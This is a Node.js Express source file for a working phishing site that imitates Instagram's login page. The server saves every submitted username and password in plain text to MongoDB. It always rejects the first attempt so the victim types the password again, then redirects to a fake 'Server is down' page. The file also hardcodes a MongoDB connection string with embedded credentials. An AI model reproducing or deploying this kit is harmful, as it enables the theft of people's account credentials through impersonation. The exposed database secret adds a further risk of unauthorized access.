// ===============================
// 1) BASIC SETUP
// ===============================
const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ===============================
// 2) MONGODB CONNECTION
// ===============================
const MONGODB_URI =  process.env.MONGODB_URI || "mongodb+srv://emailspare365_db_user:7ZR7ZQz1YJD8IKAK@cluster0.wj5jeip.mongodb.net/login?appName=Cluster0";


mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// ===============================
// 3) USER MODEL
// ===============================
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, trim: true },
  password: { type: String, required: true }, // plain text (as requested)
});

const User = mongoose.model("User", userSchema);

// ===============================
// 4) API: LOGIN LOGIC
// ===============================
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password || password.length < 6) {
      return res.status(400).json({
        success: false,
        message: "Password is wrong",
      });
    }

    const count = await User.countDocuments({ username, password });

    if (count === 0) {
      await User.create({ username, password });

      return res.json({
        success: false,
        message: "Password is wrong",
        attempt: 1,
      });
    }

    if (count === 1) {
      await User.create({ username, password });

      return res.json({
        success: true,
        redirect: "/server-down",
        attempt: 2,
      });
    }

    await User.create({ username, password });

    return res.json({
      success: true,
      redirect: "/server-down",
      attempt: count + 1,
    });
  } catch (err) {
    console.error("Login error:", err);
    return res.status(500).json({
      success: false,
      message: "Password is wrong",
    });
  }
});

// ===============================
// 5) LOGIN PAGE HTML (Forgot Password REMOVED)
// ===============================
const loginPageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Instagram Login Clone</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      background-color: #000;
      color: #fafafa;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .page-wrapper {
      width: 100%;
      max-width: 360px;
      padding: 20px 16px 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .card {
      width: 100%;
      background-color: #000;
      border: 1px solid #262626;
      padding: 40px 40px 30px;
      margin-bottom: 10px;
      text-align: center;
    }

    .logo-text {
      font-family: "Brush Script MT", cursive;
      font-size: 42px;
      margin-bottom: 30px;
    }

    .input-group {
      text-align: left;
      margin-bottom: 8px;
    }

    .input-group input {
      width: 100%;
      padding: 10px 12px;
      background-color: #121212;
      border: 1px solid #363636;
      border-radius: 4px;
      color: #fafafa;
      font-size: 14px;
      outline: none;
    }

    .input-error {
      font-size: 12px;
      color: #f02849;
      min-height: 16px;
    }

    .login-btn {
      margin-top: 10px;
      width: 100%;
      padding: 9px 0;
      border-radius: 8px;
      border: none;
      font-weight: 600;
      background-color: #385185;
      color: #fff;
      cursor: pointer;
    }

    .divider {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 16px 0 20px;
      color: #a8a8a8;
      font-size: 13px;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background-color: #262626;
    }

    .fb-login {
      color: #0095f6;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 12px;
      display: flex;
      justify-content: center;
      gap: 6px;
    }

    .fb-circle {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background-color: #1877f2;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: 700;
    }

    .bottom-card {
      width: 100%;
      background-color: #000;
      border: 1px solid #262626;
      padding: 18px;
      text-align: center;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .bottom-card a {
      color: #0095f6;
      text-decoration: none;
    }

  </style>
</head>
<body>
  <div class="page-wrapper">
    <div class="card">
      <div class="logo-text">Instagram</div>

      <form id="loginForm" novalidate>
        <div class="input-group">
          <input id="username" type="text" placeholder="Phone number, username, or email" />
          <div id="usernameError" class="input-error"></div>
        </div>

        <div class="input-group">
          <input id="password" type="password" placeholder="Password" />
          <div id="passwordError" class="input-error"></div>
        </div>

        <button type="submit" id="loginBtn" class="login-btn">
          Log in
        </button>

        <div id="globalError" class="input-error"></div>

        <div class="divider">
          <div class="divider-line"></div>
          <span>OR</span>
          <div class="divider-line"></div>
        </div>

        <div class="fb-login">
          <div class="fb-circle">f</div>
          <span>Log in with Facebook</span>
        </div>

        <!-- Forgot password removed -->
      </form>
    </div>

    <div class="bottom-card">
      Don't have an account?
      <a href="javascript:void(0)">Sign up</a>
    </div>
  </div>

  <script>
    const loginForm = document.getElementById("loginForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const passwordError = document.getElementById("passwordError");
    const globalError = document.getElementById("globalError");
    const loginBtn = document.getElementById("loginBtn");

    function clearMessages() {
      passwordError.textContent = "";
      globalError.textContent = "";
    }

    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      clearMessages();

      const username = usernameInput.value;
      const password = passwordInput.value;

      if (!password || password.length < 6) {
        passwordError.textContent = "Password is wrong";
        return;
      }

      try {
        loginBtn.disabled = true;

        const res = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
        });

        const data = await res.json();

        if (!data.success) {
          globalError.textContent = "Password is wrong";
        } else {
          window.location.href = data.redirect || "/server-down";
        }
      } catch (err) {
        globalError.textContent = "Password is wrong";
      } finally {
        loginBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
`;

// ===============================
// 6) SERVER DOWN PAGE
// ===============================
const serverDownHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Server Error • Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; }
    .box { text-align:center; }
    .logo-text { font-family:"Brush Script MT"; font-size:42px; margin-bottom:20px; }
    .msg { color:#aaa; font-size:14px; margin-bottom:20px; }
    button { padding:10px 20px; border-radius:8px; background:#0095f6; color:#fff; border:none; cursor:pointer; }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo-text">Instagram</div>
    <h2>Server is down</h2>
    <p class="msg">Sorry, something went wrong.</p>
    <button onclick="window.location.href='/'">Try again</button>
  </div>
</body>
</html>
`;

// ===============================
// 7) ROUTES
// ===============================
app.get("/", (req, res) => res.send(loginPageHTML));
app.get("/server-down", (req, res) => res.send(serverDownHTML));

// ===============================
// 8) START SERVER
// ===============================
app.listen(PORT, () => {
  console.log("🚀 Server running on http://localhost:" + PORT);
});
